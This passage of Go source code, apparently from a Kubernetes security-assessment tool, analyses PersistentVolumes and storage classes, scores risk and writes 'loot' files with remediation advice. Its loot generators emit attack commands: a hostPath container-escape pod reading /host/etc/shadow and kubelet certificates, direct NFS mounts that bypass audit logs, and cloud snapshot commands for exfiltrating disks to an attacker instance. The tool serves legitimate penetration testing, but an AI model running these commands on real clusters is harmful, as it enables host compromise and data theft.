		analysis.RiskLevel = "HIGH"
		analysis.DataLeakageRisk = true
		analysis.Issues = append(analysis.Issues,
			"Volume will persist after PVC deletion",
			"Previous tenant data may be accessible",
			"Manual cleanup required to prevent data leakage",
		)
	case "Recycle":
		analysis.RiskLevel = "MEDIUM"
		analysis.Issues = append(analysis.Issues,
			"Recycle policy is deprecated",
			"Basic scrub may leave data remnants",
			"Use Delete policy instead",
		)
	case "Delete":
		analysis.RiskLevel = "LOW"
		// This is the secure option
	default:
		analysis.RiskLevel = "MEDIUM"
		analysis.Issues = append(analysis.Issues, "Unknown reclaim policy: "+policy)
	}

	return analysis
}

// analyzeAccessModes analyzes access mode security
func analyzeAccessModes(pv corev1.PersistentVolume, boundPods []string) AccessModeAnalysis {
	analysis := AccessModeAnalysis{
		Modes:         pv.Spec.AccessModes,
		BoundPodCount: len(boundPods),
		RiskLevel:     "LOW",
	}

	hasRWX := false
	for _, mode := range pv.Spec.AccessModes {
		if mode == corev1.ReadWriteMany {
			hasRWX = true
			analysis.AllowsReadWriteMany = true
		}
	}

	if hasRWX {
		if len(boundPods) > 1 {
			analysis.RiskLevel = "HIGH"
			analysis.Issues = append(analysis.Issues,
				fmt.Sprintf("ReadWriteMany volume accessed by %d pods", len(boundPods)),
				"Risk of data corruption from concurrent writes",
				"Lateral movement: compromise one pod → access shared data",
				"No access control between pods sharing volume",
			)
		} else if len(boundPods) == 1 {
			analysis.RiskLevel = "MEDIUM"
			analysis.Issues = append(analysis.Issues,
				"ReadWriteMany allows multi-pod access (currently 1 pod)",
				"Potential lateral movement vector if more pods added",
			)
		} else {
			analysis.RiskLevel = "MEDIUM"
			analysis.Issues = append(analysis.Issues,
				"ReadWriteMany capability available (no pods currently bound)",
			)
		}
	}

	return analysis
}

// analyzeNFSSecurity analyzes NFS volume security
func analyzeNFSSecurity(pv corev1.PersistentVolume) NFSSecurityAnalysis {
	analysis := NFSSecurityAnalysis{
		NoAuth:    true, // NFS typically has no authentication
		RiskLevel: "MEDIUM",
	}

	if pv.Spec.NFS == nil {
		return NFSSecurityAnalysis{}
	}

	analysis.Server = pv.Spec.NFS.Server
	analysis.Path = pv.Spec.NFS.Path
	analysis.ReadOnly = pv.Spec.NFS.ReadOnly
	analysis.RiskLevel = "HIGH"

	analysis.Issues = append(analysis.Issues,
		"NFS typically has no authentication",
		"Anyone with network access to NFS server can mount the share",
		"Check NFS export restrictions on server (/etc/exports)",
		"Recommend: Use Kerberos authentication (sec=krb5) or migrate to CSI driver",
		fmt.Sprintf("Direct mount possible: mount -t nfs %s:%s /mnt/data", analysis.Server, analysis.Path),
	)

	if !analysis.ReadOnly {
		analysis.RiskLevel = "CRITICAL"
		analysis.Issues = append(analysis.Issues,
			"Read-write NFS export - data tampering possible",
			"Attacker with network access can modify data directly",
		)
	}

	return analysis
}

// analyzeCSISecurity analyzes CSI driver security
func analyzeCSISecurity(pv corev1.PersistentVolume) CSISecurityAnalysis {
	analysis := CSISecurityAnalysis{
		RiskLevel: "LOW",
	}

	if pv.Spec.CSI == nil {
		return analysis
	}

	analysis.Driver = pv.Spec.CSI.Driver
	analysis.VolumeHandle = pv.Spec.CSI.VolumeHandle
	analysis.Attributes = pv.Spec.CSI.VolumeAttributes

	// Check for known vulnerable or unauthenticated drivers
	vulnerableDrivers := map[string]string{
		"smb.csi.k8s.io":      "SMB driver - verify authentication configuration",
		"nfs.csi.k8s.io":      "NFS driver - typically no authentication",
		"csi-nfsplugin":       "NFS plugin - verify authentication",
		"cephfs.csi.ceph.com": "CephFS - verify authentication keys",
		"rbd.csi.ceph.com":    "Ceph RBD - verify authentication keys",
	}

	for pattern, vuln := range vulnerableDrivers {
		if strings.Contains(analysis.Driver, pattern) {
			analysis.KnownVulnerability = vuln
			analysis.RiskLevel = "MEDIUM"
			analysis.SecurityIssues = append(analysis.SecurityIssues, vuln)
		}
	}

	// Check for encryption
	if encrypted, ok := pv.Spec.CSI.VolumeAttributes["encrypted"]; ok && encrypted == "true" {
		analysis.IsEncrypted = true
	} else {
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"CSI volume encryption not explicitly configured")
	}

	return analysis
}

// analyzeStorageClassSecurity analyzes storage class security
func analyzeStorageClassSecurity(sc storagev1.StorageClass) StorageClassAnalysis {
	analysis := StorageClassAnalysis{
		Name:                 sc.Name,
		Provisioner:          sc.Provisioner,
		AllowVolumeExpansion: sc.AllowVolumeExpansion != nil && *sc.AllowVolumeExpansion,
		Parameters:           sc.Parameters,
		RiskLevel:            "LOW",
	}

	if sc.VolumeBindingMode != nil {
		analysis.VolumeBindingMode = string(*sc.VolumeBindingMode)
	}

	if sc.ReclaimPolicy != nil {
		analysis.ReclaimPolicy = string(*sc.ReclaimPolicy)
		if *sc.ReclaimPolicy == corev1.PersistentVolumeReclaimRetain {
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Reclaim policy 'Retain' - volumes persist after deletion (data leakage risk)")
			analysis.RiskLevel = "MEDIUM"
		}
	}

	// Check for hostPath provisioner
	if strings.Contains(strings.ToLower(sc.Provisioner), "hostpath") {
		analysis.AllowsHostPath = true
		analysis.AllowsPrivilegedAccess = true
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"CRITICAL: HostPath provisioner allows direct host filesystem access")
		analysis.RiskLevel = "CRITICAL"
	}

	// Check for local volume provisioner
	if strings.Contains(strings.ToLower(sc.Provisioner), "local") {
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"Local volume provisioner - verify node security")
		analysis.RiskLevel = "MEDIUM"
	}

	// Check encryption parameters
	if encrypted, ok := sc.Parameters["encrypted"]; ok && encrypted == "true" {
		analysis.RequiresEncryption = true
	} else {
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"Encryption not enforced by storage class")
	}

	return analysis
}

// detectVolumeEscalationPaths detects privilege escalation paths
func detectVolumeEscalationPaths(finding PersistentVolumeFinding) []string {
	var paths []string

	if finding.IsHostPath {
		paths = append(paths, "Container escape via HostPath volume")
		if finding.AllowsHostRoot {
			paths = append(paths, "Full host filesystem access → node compromise")
		}
		if finding.AllowsKubeletAccess {
			paths = append(paths, "Kubelet credentials access → cluster-admin")
		}
		if finding.AllowsVarRunAccess {
			paths = append(paths, "Container runtime socket access → node compromise")
		}
	}

	if finding.IsNetworkStorage && !finding.NFSReadOnly {
		paths = append(paths, "Direct network storage access (bypass Kubernetes RBAC)")
	}

	if finding.AllowsReadWriteMany && finding.BoundPodCount > 1 {
		paths = append(paths, "Lateral movement via shared volume access")
	}

	if finding.OrphanedVolume {
		paths = append(paths, "Access previous tenant data via orphaned volume")
	}

	return paths
}

// detectExfiltrationScenarios detects data exfiltration scenarios
func detectExfiltrationScenarios(finding PersistentVolumeFinding) []string {
	var scenarios []string

	if finding.ContainsDatabaseData || finding.ContainsSecretData {
		scenarios = append(scenarios, "Snapshot volume → restore to attacker PVC → exfiltrate")
	}

	if finding.IsNetworkStorage {
		scenarios = append(scenarios, "Direct network mount → bypass Kubernetes audit logs")
	}

	if finding.CloudVolumeID != "<NONE>" && finding.CloudVolumeID != "" {
		scenarios = append(scenarios, "Cloud snapshot → attach to attacker instance → exfiltrate")
	}

	if finding.AllowsReadWriteMany {
		scenarios = append(scenarios, "Compromise any pod with access → read all shared data")
	}

	if finding.ReclaimPolicy == "Retain" {
		scenarios = append(scenarios, "Delete PVC → reclaim orphaned volume → access old data")
	}

	return scenarios
}

// generateAttackPaths generates complete attack chains
func generateAttackPaths(finding PersistentVolumeFinding) []string {
	var paths []string

	if finding.IsHostPath && finding.AllowsHostRoot {
		paths = append(paths,
			"[Container Escape → Full Cluster Compromise]",
			"1. Create PVC claiming this HostPath PV",
			"2. Deploy pod with PVC mounted",
			"3. Access /host filesystem from container",
			"4. Read /host/etc/shadow, /host/root/.kube/config",
			"5. Access kubelet certs at /host/var/lib/kubelet/pki",
			"6. Authenticate to API server as node",
			"7. Escalate to cluster-admin",
		)
	}

	if finding.ContainsDatabaseData && !finding.IsEncrypted {
		paths = append(paths,
			"[Database Exfiltration]",
			"1. Create VolumeSnapshot of this PV",
			"2. Create new PVC from snapshot",
			"3. Mount PVC in attacker pod",
			"4. Extract database files",
			"5. Exfiltrate sensitive data",
		)
	}

	if finding.IsNetworkStorage && !finding.NFSReadOnly {
		paths = append(paths,
			"[Direct Network Access]",
			fmt.Sprintf("1. Mount NFS share directly: mount -t nfs %s:%s /mnt", finding.NFSServer, finding.NFSPath),
			"2. Bypass Kubernetes RBAC and audit logs",
			"3. Read/modify data directly",
			"4. Inject malicious files into application volumes",
		)
	}

	return paths
}

// generateRecommendations generates security recommendations
func generateRecommendations(finding PersistentVolumeFinding) []string {
	var recommendations []string

	if finding.IsHostPath {
		recommendations = append(recommendations,
			"CRITICAL: Remove HostPath volume or restrict with PodSecurityPolicy/PodSecurity admission",
			"Use CSI driver or cloud provider volumes instead",
			"If HostPath required, use read-only mounts and restrict paths",
		)
	}

	if !finding.IsEncrypted && (finding.ContainsDatabaseData || finding.ContainsSecretData) {
		recommendations = append(recommendations,
			"Enable encryption at rest for sensitive data",
			"Use cloud provider encryption or CSI driver encryption",
		)
	}

	if finding.ReclaimPolicy == "Retain" {
		recommendations = append(recommendations,
			"Change reclaim policy to 'Delete' to prevent data leakage",
			"Implement automated cleanup of released volumes",
		)
	}

	if finding.AllowsReadWriteMany && finding.BoundPodCount > 1 {
		recommendations = append(recommendations,
			"Consider ReadWriteOnce access mode if multi-pod access not required",
			"Implement application-level locking for concurrent access",
		)
	}

	if finding.IsNetworkStorage {
		recommendations = append(recommendations,
			"Enable Kerberos authentication for NFS (sec=krb5)",
			"Migrate to CSI driver with authentication",
			"Restrict network access to NFS server",
		)
	}

	if finding.OrphanedVolume {
		recommendations = append(recommendations,
			"Delete released volumes after data cleanup",
			"Implement automated orphaned volume detection",
		)
	}

	if len(recommendations) == 0 {
		recommendations = append(recommendations, "No critical security issues detected")
	}

	return recommendations
}

// calculateVolumeRiskScore calculates comprehensive risk score
func calculateVolumeRiskScore(finding PersistentVolumeFinding) (string, int) {
	score := 0

	// HostPath = CRITICAL
	if finding.IsHostPath {
		score += 100
		if finding.AllowsHostRoot || finding.AllowsKubeletAccess {
			return "CRITICAL", 100
		}
	}

	// Unencrypted sensitive data
	if !finding.IsEncrypted && (finding.ContainsDatabaseData || finding.ContainsSecretData) {
		score += 40
	}

	// Reclaim policy Retain
	if finding.ReclaimPolicy == "Retain" {
		score += 20
	}

	// ReadWriteMany with multiple pods
	if finding.AllowsReadWriteMany && finding.BoundPodCount > 1 {
		score += 30
	}

	// Network storage without auth
	if finding.IsNetworkStorage && !finding.NFSReadOnly {
		score += 50
	}

	// Orphaned volumes
	if finding.OrphanedVolume {
		score += 35
	}

	// Sensitive data type
	if finding.SensitiveDataType != "" {
		score += 15
	}

	// Determine risk level
	if score >= 80 {
		return "CRITICAL", score
	} else if score >= 50 {
		return "HIGH", score
	} else if score >= 25 {
		return "MEDIUM", score
	}
	return "LOW", score
}

// generateLootContent generates content for all loot files
func generateLootContent(finding *PersistentVolumeFinding, lootEnum, lootHostPath, lootEscalation,
	lootUnencrypted, lootExfiltration, lootNetworkStorage, lootReclaimPolicy, lootReadWriteMany,
	lootOrphaned, lootCloudAccess, lootDataAccess, lootAttackPaths, lootMisconfigurations,
	lootRemediation *[]string) {

	// Enumeration
	*lootEnum = append(*lootEnum, fmt.Sprintf("\n# PersistentVolume: %s (Risk: %s)", finding.PVName, finding.RiskLevel))
	*lootEnum = append(*lootEnum, fmt.Sprintf("kubectl get pv %s -o yaml", finding.PVName))
	*lootEnum = append(*lootEnum, fmt.Sprintf("kubectl describe pv %s", finding.PVName))
	if finding.PVCName != "" && finding.PVCNamespace != "" {
		*lootEnum = append(*lootEnum, fmt.Sprintf("kubectl get pvc %s -n %s -o yaml", finding.PVCName, finding.PVCNamespace))
		*lootEnum = append(*lootEnum, fmt.Sprintf("kubectl describe pvc %s -n %s", finding.PVCName, finding.PVCNamespace))
	}
	*lootEnum = append(*lootEnum, "")

	// HostPath volumes
	if finding.IsHostPath {
		*lootHostPath = append(*lootHostPath, fmt.Sprintf("\n# PV: %s - RISK: %s", finding.PVName, finding.HostPathRisk))
		*lootHostPath = append(*lootHostPath, fmt.Sprintf("# HostPath: %s", finding.HostPathPath))
		*lootHostPath = append(*lootHostPath, "# Container Escape Technique:")
		*lootHostPath = append(*lootHostPath, `cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-escape
  namespace: `+finding.PVCNamespace+`
spec:
  containers:
  - name: escape
    image: alpine
    command: ["sh", "-c", "sleep 3600"]
    volumeMounts:
    - name: hostpath
      mountPath: /host
  volumes:
  - name: hostpath
    persistentVolumeClaim:
      claimName: `+finding.PVCName+`
EOF`)
		*lootHostPath = append(*lootHostPath, "kubectl exec -it hostpath-escape -n "+finding.PVCNamespace+" -- sh")
		*lootHostPath = append(*lootHostPath, "# Inside container: ls -la /host")
		*lootHostPath = append(*lootHostPath, "# Access host filesystem, read /host/etc/shadow, /host/root/.kube/config")
		*lootHostPath = append(*lootHostPath, "")
	}

	// Privilege escalation
	if len(finding.EscalationPaths) > 0 {
		*lootEscalation = append(*lootEscalation, fmt.Sprintf("\n# PV: %s", finding.PVName))
		*lootEscalation = append(*lootEscalation, "# Escalation Paths:")
		for _, path := range finding.EscalationPaths {
			*lootEscalation = append(*lootEscalation, "# - "+path)
		}
		*lootEscalation = append(*lootEscalation, "")
	}

	// Unencrypted sensitive data
	if !finding.IsEncrypted && finding.SensitiveDataType != "" {
		*lootUnencrypted = append(*lootUnencrypted, fmt.Sprintf("\n# PV: %s", finding.PVName))
		*lootUnencrypted = append(*lootUnencrypted, fmt.Sprintf("# Sensitive Data Type: %s", finding.SensitiveDataType))
		*lootUnencrypted = append(*lootUnencrypted, fmt.Sprintf("# Encryption: NONE"))
		*lootUnencrypted = append(*lootUnencrypted, "# Risk: Data exposure via snapshots or direct access")
		*lootUnencrypted = append(*lootUnencrypted, "")
	}

	// Data exfiltration
	if len(finding.ExfiltrationScenarios) > 0 {
		*lootExfiltration = append(*lootExfiltration, fmt.Sprintf("\n# PV: %s", finding.PVName))
		*lootExfiltration = append(*lootExfiltration, "# Exfiltration Techniques:")
		for _, scenario := range finding.ExfiltrationScenarios {
			*lootExfiltration = append(*lootExfiltration, "# "+scenario)
		}
		if finding.PVCName != "" {
			*lootExfiltration = append(*lootExfiltration, "\n# Snapshot-based exfiltration:")
			*lootExfiltration = append(*lootExfiltration, fmt.Sprintf("kubectl create volumesnapshot %s-snapshot --source-pvc=%s -n %s",
				finding.PVCName, finding.PVCName, finding.PVCNamespace))
			*lootExfiltration = append(*lootExfiltration, "# Wait for snapshot to be ready")
			*lootExfiltration = append(*lootExfiltration, "# Create new PVC from snapshot and mount in attacker pod")
		}
		*lootExfiltration = append(*lootExfiltration, "")
	}

	// Network storage
	if finding.IsNetworkStorage {
		*lootNetworkStorage = append(*lootNetworkStorage, fmt.Sprintf("\n# PV: %s", finding.PVName))
		*lootNetworkStorage = append(*lootNetworkStorage, fmt.Sprintf("# NFS Server: %s", finding.NFSServer))
		*lootNetworkStorage = append(*lootNetworkStorage, fmt.Sprintf("# NFS Path: %s", finding.NFSPath))
		*lootNetworkStorage = append(*lootNetworkStorage, fmt.Sprintf("# Read-Only: %t", finding.NFSReadOnly))
		*lootNetworkStorage = append(*lootNetworkStorage, "# Direct mount (bypass Kubernetes):")
		*lootNetworkStorage = append(*lootNetworkStorage, fmt.Sprintf("mkdir -p /mnt/nfs-%s", finding.PVName))
		*lootNetworkStorage = append(*lootNetworkStorage, fmt.Sprintf("mount -t nfs %s:%s /mnt/nfs-%s", finding.NFSServer, finding.NFSPath, finding.PVName))
		*lootNetworkStorage = append(*lootNetworkStorage, "# Access data without Kubernetes audit logs")
		*lootNetworkStorage = append(*lootNetworkStorage, "")
	}

	// Reclaim policy
	if finding.ReclaimPolicy == "Retain" {
		*lootReclaimPolicy = append(*lootReclaimPolicy, fmt.Sprintf("\n# PV: %s", finding.PVName))
		*lootReclaimPolicy = append(*lootReclaimPolicy, "# Reclaim Policy: Retain")
		*lootReclaimPolicy = append(*lootReclaimPolicy, "# Risk: Volume persists after PVC deletion")
		*lootReclaimPolicy = append(*lootReclaimPolicy, "# Attack: Delete PVC, wait for volume release, reclaim orphaned volume")
		*lootReclaimPolicy = append(*lootReclaimPolicy, "")
	}

	// ReadWriteMany
	if finding.AllowsReadWriteMany {
		*lootReadWriteMany = append(*lootReadWriteMany, fmt.Sprintf("\n# PV: %s", finding.PVName))
		*lootReadWriteMany = append(*lootReadWriteMany, fmt.Sprintf("# Bound Pods: %d", finding.BoundPodCount))
		*lootReadWriteMany = append(*lootReadWriteMany, "# Risk: Shared access across pods")
		if finding.BoundPodCount > 1 {
			*lootReadWriteMany = append(*lootReadWriteMany, "# Pods with access:")
			for _, pod := range finding.BoundPods {
				*lootReadWriteMany = append(*lootReadWriteMany, fmt.Sprintf("#   - %s", pod))
			}
			*lootReadWriteMany = append(*lootReadWriteMany, "# Lateral movement: Compromise any pod → access all shared data")
		}
		*lootReadWriteMany = append(*lootReadWriteMany, "")
	}

	// Orphaned volumes
	if finding.OrphanedVolume || finding.UnusedVolume {
		*lootOrphaned = append(*lootOrphaned, fmt.Sprintf("\n# PV: %s (Status: %s)", finding.PVName, finding.Status))
		if finding.OrphanedVolume {
			*lootOrphaned = append(*lootOrphaned, "# Status: Released (orphaned)")
			*lootOrphaned = append(*lootOrphaned, "# May contain previous tenant data")
		} else {
			*lootOrphaned = append(*lootOrphaned, "# Status: Available (unbound)")
			*lootOrphaned = append(*lootOrphaned, "# Check for old data before claiming")
		}
		*lootOrphaned = append(*lootOrphaned, "")
	}

	// Cloud access
	if finding.CloudVolumeID != "<NONE>" && finding.CloudVolumeID != "" {
		cloudLoot := generateCloudVolumeLoot(finding.VolumeType, finding.CloudVolumeID, finding.PVName)
		*lootCloudAccess = append(*lootCloudAccess, cloudLoot...)
	}

	// Data access
	if finding.PVCName != "" && finding.PVCNamespace != "" {
		*lootDataAccess = append(*lootDataAccess, fmt.Sprintf("\n# Access PVC: %s/%s", finding.PVCNamespace, finding.PVCName))
		*lootDataAccess = append(*lootDataAccess, "# Create temporary pod to access data:")
		inspectorName := strings.ReplaceAll(finding.PVCName, ".", "-")
		*lootDataAccess = append(*lootDataAccess, fmt.Sprintf(`cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pvc-inspector-%s
  namespace: %s
spec:
  containers:
  - name: inspector
    image: busybox
    command: ["sleep", "3600"]
    volumeMounts:
    - name: data
      mountPath: /data
  volumes:
  - name: data
    persistentVolumeClaim:
      claimName: %s
EOF`, inspectorName, finding.PVCNamespace, finding.PVCName))
		*lootDataAccess = append(*lootDataAccess, fmt.Sprintf("kubectl exec -it pvc-inspector-%s -n %s -- sh", inspectorName, finding.PVCNamespace))
		*lootDataAccess = append(*lootDataAccess, fmt.Sprintf("# List files: kubectl exec pvc-inspector-%s -n %s -- ls -laR /data", inspectorName, finding.PVCNamespace))
		*lootDataAccess = append(*lootDataAccess, fmt.Sprintf("# Copy data: kubectl cp %s/pvc-inspector-%s:/data ./pvc-data-%s", finding.PVCNamespace, inspectorName, finding.PVCName))
		*lootDataAccess = append(*lootDataAccess, fmt.Sprintf("# Cleanup: kubectl delete pod pvc-inspector-%s -n %s", inspectorName, finding.PVCNamespace))
		*lootDataAccess = append(*lootDataAccess, "")
	}

	// Attack paths
	if len(finding.AttackPaths) > 0 {
		*lootAttackPaths = append(*lootAttackPaths, fmt.Sprintf("\n# PV: %s - Risk: %s", finding.PVName, finding.RiskLevel))
		for _, path := range finding.AttackPaths {
			*lootAttackPaths = append(*lootAttackPaths, path)
		}
		*lootAttackPaths = append(*lootAttackPaths, "")
	}

	// Misconfigurations
	if len(finding.SecurityIssues) > 0 {
		*lootMisconfigurations = append(*lootMisconfigurations, fmt.Sprintf("\n# PV: %s", finding.PVName))
		*lootMisconfigurations = append(*lootMisconfigurations, "# Security Issues:")
		for _, issue := range finding.SecurityIssues {
			*lootMisconfigurations = append(*lootMisconfigurations, "# - "+issue)
		}
		*lootMisconfigurations = append(*lootMisconfigurations, "")
	}

	// Remediation
	if len(finding.Recommendations) > 0 {
		*lootRemediation = append(*lootRemediation, fmt.Sprintf("\n# PV: %s - Risk: %s", finding.PVName, finding.RiskLevel))
		*lootRemediation = append(*lootRemediation, "# Recommendations:")
		for _, rec := range finding.Recommendations {
			*lootRemediation = append(*lootRemediation, "# "+rec)
		}
		*lootRemediation = append(*lootRemediation, "")
	}
}

// generateSnapshotLoot enumerates volume snapshots
func generateSnapshotLoot(ctx context.Context, clientset *kubernetes.Clientset, lootSnapshots *[]string) {
	*lootSnapshots = append(*lootSnapshots, "\n# Enumerating VolumeSnapshots...")
	*lootSnapshots = append(*lootSnapshots, "# Note: VolumeSnapshot is a CRD and may not be available in all clusters")
	*lootSnapshots = append(*lootSnapshots, "")
	*lootSnapshots = append(*lootSnapshots, "# Check if VolumeSnapshot CRD exists:")
	*lootSnapshots = append(*lootSnapshots, "kubectl get crd volumesnapshots.snapshot.storage.k8s.io")
	*lootSnapshots = append(*lootSnapshots, "")
	*lootSnapshots = append(*lootSnapshots, "# List all VolumeSnapshots:")
	*lootSnapshots = append(*lootSnapshots, "kubectl get volumesnapshots --all-namespaces")
	*lootSnapshots = append(*lootSnapshots, "")
	*lootSnapshots = append(*lootSnapshots, "# List VolumeSnapshotClasses:")
	*lootSnapshots = append(*lootSnapshots, "kubectl get volumesnapshotclasses")
	*lootSnapshots = append(*lootSnapshots, "")
	*lootSnapshots = append(*lootSnapshots, "# Data exfiltration via snapshots:")
	*lootSnapshots = append(*lootSnapshots, "# 1. Create snapshot: kubectl create volumesnapshot <name> --source-pvc=<target-pvc> -n <namespace>")
	*lootSnapshots = append(*lootSnapshots, "# 2. Wait for ready: kubectl get volumesnapshot <name> -n <namespace>")
	*lootSnapshots = append(*lootSnapshots, "# 3. Create PVC from snapshot:")
	*lootSnapshots = append(*lootSnapshots, `# cat <<EOF | kubectl apply -f -
# apiVersion: v1
# kind: PersistentVolumeClaim
# metadata:
#   name: restored-data
# spec:
#   dataSource:
#     name: <snapshot-name>
#     kind: VolumeSnapshot
#     apiGroup: snapshot.storage.k8s.io
#   accessModes:
#     - ReadWriteOnce
#   resources:
#     requests:
#       storage: 10Gi
# EOF`)
	*lootSnapshots = append(*lootSnapshots, "# 4. Mount in pod and exfiltrate data")
	*lootSnapshots = append(*lootSnapshots, "")
}

// detectVolumeSource returns volume type, cloud volume ID, and provisioner
func detectVolumeSource(source corev1.PersistentVolumeSource) (string, string, string) {
	if source.AWSElasticBlockStore != nil {
		return "AWS EBS", source.AWSElasticBlockStore.VolumeID, "kubernetes.io/aws-ebs"
	}
	if source.GCEPersistentDisk != nil {
		return "GCE PD", source.GCEPersistentDisk.PDName, "kubernetes.io/gce-pd"
	}
	if source.AzureDisk != nil {
		return "Azure Disk", source.AzureDisk.DiskName, "kubernetes.io/azure-disk"
	}
	if source.AzureFile != nil {
		return "Azure File", source.AzureFile.ShareName, "kubernetes.io/azure-file"
	}
	if source.CSI != nil {
		volumeHandle := "<NONE>"
		if source.CSI.VolumeHandle != "" {
			volumeHandle = source.CSI.VolumeHandle
		}
		return "CSI", volumeHandle, source.CSI.Driver
	}
	if source.NFS != nil {
		return "NFS", fmt.Sprintf("%s:%s", source.NFS.Server, source.NFS.Path), "nfs"
	}
	if source.HostPath != nil {
		return "HostPath", source.HostPath.Path, "hostPath"
	}
	if source.Local != nil {
		return "Local", source.Local.Path, "local"
	}
	if source.ISCSI != nil {
		return "iSCSI", fmt.Sprintf("%s:%s", source.ISCSI.TargetPortal, source.ISCSI.IQN), "iscsi"
	}
	if source.Glusterfs != nil {
		return "Glusterfs", fmt.Sprintf("%s:%s", source.Glusterfs.EndpointsName, source.Glusterfs.Path), "glusterfs"
	}
	if source.RBD != nil {
		return "RBD/Ceph", source.RBD.RBDImage, "rbd"
	}
	if source.Cinder != nil {
		return "OpenStack Cinder", source.Cinder.VolumeID, "cinder"
	}
	if source.FC != nil {
		return "Fibre Channel", strings.Join(source.FC.TargetWWNs, ","), "fc"
	}
	if source.Flocker != nil {
		return "Flocker", source.Flocker.DatasetName, "flocker"
	}
	if source.VsphereVolume != nil {
		return "vSphere", source.VsphereVolume.VolumePath, "vsphere"
	}
	if source.Quobyte != nil {
		return "Quobyte", source.Quobyte.Volume, "quobyte"
	}
	if source.PhotonPersistentDisk != nil {
		return "Photon PD", source.PhotonPersistentDisk.PdID, "photon"
	}
	if source.PortworxVolume != nil {
		return "Portworx", source.PortworxVolume.VolumeID, "portworx"
	}
	if source.ScaleIO != nil {
		return "ScaleIO", source.ScaleIO.VolumeName, "scaleio"
	}
	if source.StorageOS != nil {
		return "StorageOS", source.StorageOS.VolumeName, "storageos"
	}
	return "<UNKNOWN>", "<NONE>", "<NONE>"
}

// generateCloudVolumeLoot generates cloud-specific commands to access volumes
func generateCloudVolumeLoot(volumeType, volumeID, pvName string) []string {
	loot := []string{fmt.Sprintf("\n# PV: %s (%s)", pvName, volumeType)}

	switch volumeType {
	case "AWS EBS":
		loot = append(loot, "# AWS EBS Volume Access:")
		loot = append(loot, fmt.Sprintf("aws ec2 describe-volumes --volume-ids %s", volumeID))
		loot = append(loot, "# Check encryption:")
		loot = append(loot, fmt.Sprintf("aws ec2 describe-volumes --volume-ids %s --query 'Volumes[0].Encrypted'", volumeID))
		loot = append(loot, "# Create snapshot for exfiltration:")
		loot = append(loot, fmt.Sprintf("aws ec2 create-snapshot --volume-id %s --description 'Snapshot of %s'", volumeID, pvName))
		loot = append(loot, "# Create volume from snapshot and attach to attacker instance:")
		loot = append(loot, "# SNAPSHOT_ID=$(aws ec2 create-snapshot --volume-id "+volumeID+" --query 'SnapshotId' --output text)")
		loot = append(loot, "# aws ec2 wait snapshot-completed --snapshot-ids $SNAPSHOT_ID")
		loot = append(loot, "# NEW_VOL=$(aws ec2 create-volume --snapshot-id $SNAPSHOT_ID --availability-zone <az> --query 'VolumeId' --output text)")
		loot = append(loot, "# aws ec2 attach-volume --volume-id $NEW_VOL --instance-id <attacker-instance-id> --device /dev/sdf")
		loot = append(loot, "# Mount and exfiltrate data")

	case "GCE PD":
		loot = append(loot, "# GCE Persistent Disk Access:")
		loot = append(loot, fmt.Sprintf("gcloud compute disks describe %s --zone <zone>", volumeID))
		loot = append(loot, "# Create snapshot for exfiltration:")
		loot = append(loot, fmt.Sprintf("gcloud compute disks snapshot %s --snapshot-names=%s-snapshot --zone <zone>", volumeID, pvName))
		loot = append(loot, "# Create disk from snapshot and attach:")
		loot = append(loot, fmt.Sprintf("# gcloud compute disks create %s-copy --source-snapshot=%s-snapshot --zone <zone>", pvName, pvName))
		loot = append(loot, fmt.Sprintf("# gcloud compute instances attach-disk <attacker-instance> --disk=%s-copy --zone <zone>", pvName))
		loot = append(loot, "# Mount and exfiltrate data")

	case "Azure Disk":
		loot = append(loot, "# Azure Disk Access:")
		loot = append(loot, fmt.Sprintf("az disk show --name %s --resource-group <rg>", volumeID))
		loot = append(loot, "# Create snapshot for exfiltration:")
		loot = append(loot, fmt.Sprintf("az snapshot create --resource-group <rg> --source %s --name %s-snapshot", volumeID, pvName))
		loot = append(loot, "# Create disk from snapshot and attach:")
		loot = append(loot, fmt.Sprintf("# az disk create --resource-group <rg> --name %s-copy --source %s-snapshot", pvName, pvName))
		loot = append(loot, fmt.Sprintf("# az vm disk attach --resource-group <rg> --vm-name <attacker-vm> --name %s-copy", pvName))
		loot = append(loot, "# Mount and exfiltrate data")

	case "NFS":
		loot = append(loot, "# NFS Volume Direct Access:")
		loot = append(loot, fmt.Sprintf("# Mount point: %s", volumeID))
		parts := strings.Split(volumeID, ":")
		if len(parts) == 2 {
			loot = append(loot, fmt.Sprintf("mkdir -p /mnt/%s", pvName))
			loot = append(loot, fmt.Sprintf("mount -t nfs %s /mnt/%s", volumeID, pvName))
			loot = append(loot, "# Access data directly (bypass Kubernetes RBAC)")
		}

	case "CSI":
		loot = append(loot, "# CSI Volume - check driver-specific tools")
		loot = append(loot, fmt.Sprintf("# Volume Handle: %s", volumeID))
		loot = append(loot, "# Consult CSI driver documentation for direct access methods")
	}

	loot = append(loot, "")
	return loot
}

// formatDuration formats a duration into human-readable string
func persistentVolumesFormatDuration(d time.Duration) string {
	if d.Hours() > 24*365 {
		years := int(d.Hours() / 24 / 365)
		return fmt.Sprintf("%dy", years)
	}
	if d.Hours() > 24*30 {
		months := int(d.Hours() / 24 / 30)
		return fmt.Sprintf("%dmo", months)
	}
	if d.Hours() > 24 {
		days := int(d.Hours() / 24)
		return fmt.Sprintf("%dd", days)
	}
	if d.Hours() > 1 {
		hours := int(d.Hours())
		return fmt.Sprintf("%dh", hours)
	}
	if d.Minutes() > 1 {
		minutes := int(d.Minutes())
		return fmt.Sprintf("%dm", minutes)
	}
	return "< 1m"
}
